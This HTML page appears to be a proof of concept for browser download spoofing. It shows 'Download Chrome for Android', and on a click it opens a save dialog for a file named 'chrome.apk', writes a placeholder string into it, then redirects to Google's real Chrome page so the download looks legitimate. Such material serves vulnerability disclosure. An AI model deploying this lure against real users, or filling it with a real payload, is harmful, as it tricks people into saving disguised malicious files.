<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC</title>
<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
}
.cta {
    text-align: center;
}
</style>
</head>
<body>

<div class="cta">
    <h1>Download Chrome for Android</h1>
    <p>Click anywhere to continue</p>
</div>

<script>
document.addEventListener('click', async () => {
    if (!('showSaveFilePicker' in window)) return;

    try {
        // Step 1: Trigger file picker
        const fileHandle = await window.showSaveFilePicker({
            suggestedName: 'chrome.apk',
            types: [{
                description: 'Android Package (demo)',
                accept: { 'application/octet-stream': ['.apk'] }
            }]
        });

        // Step 2: Tulis isi file (PoC: "Hai aja")
        const writable = await fileHandle.createWritable();
        await writable.write('Hai aja');
        await writable.close();

        // Step 3: Navigasi setelah picker muncul
        setTimeout(() => {
            window.location.href = 'https://www.google.com/chrome/';
        }, 250);

    } catch (e) {
        console.error('User cancelled or error:', e);
    }
}, { once: true });
</script>

</body>
</html>
